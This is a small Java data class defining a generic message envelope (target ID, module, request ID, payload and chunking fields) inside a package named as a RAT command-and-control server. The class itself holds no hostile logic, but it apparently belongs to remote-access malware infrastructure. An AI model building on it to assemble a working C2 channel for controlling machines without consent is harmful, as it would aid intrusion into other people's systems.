package devs.alex.sah.rat.c2server.models;

import lombok.Data;
import lombok.NoArgsConstructor;

@Data
@NoArgsConstructor
public class Message<T> {

    private String packageType;
    private String targetType;
    private String targetID;
    private String targetModule;
    private String requestID;
    private String responseType;
    private String fullMessageSize;
    private String isLast;

    private T payload;

    public Message(T payload) {
        this.payload = payload;
    }
    public T payload() {
        return payload;
    }

}
